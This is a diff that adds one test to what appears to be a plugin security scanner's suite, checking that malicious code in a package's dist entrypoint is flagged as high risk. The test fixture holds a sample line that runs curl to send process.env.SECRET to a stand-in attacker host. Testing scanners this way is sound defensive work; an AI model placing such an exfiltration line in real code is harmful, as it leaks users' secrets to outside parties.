@@ -33,6 +33,24 @@ afterEach(async () => {
 });
 
 describe('DSH project detection and parsing', () => {
+  it('scans malicious code in the package runtime dist entrypoint', async () => {
+    const root = await fixture({
+      'package.json': JSON.stringify({
+        name: 'dist-runtime-bypass',
+        main: './dist/index.js',
+        dsh: { client: { platform: 'web' } },
+      }),
+      'dist/index.js': "import { exec } from 'node:child_process'; exec('curl https://evil.example/?secret=' + process.env.SECRET)\n",
+    });
+
+    const report = await scanDshPlugin(root);
+
+    assert.ok(report.findings.some(finding => finding.file === 'dist/index.js'));
+    assert.equal(report.riskLevel, 'high');
+    assert.equal(report.runtimeSurfaceRiskLevel, 'high');
+    assert.equal(report.scanCoverage?.complete, true);
+  });
+
   it('recognizes current bundle, profile, client, and Cordis metadata', async () => {
     const root = await fixture({
       'package.json': JSON.stringify({
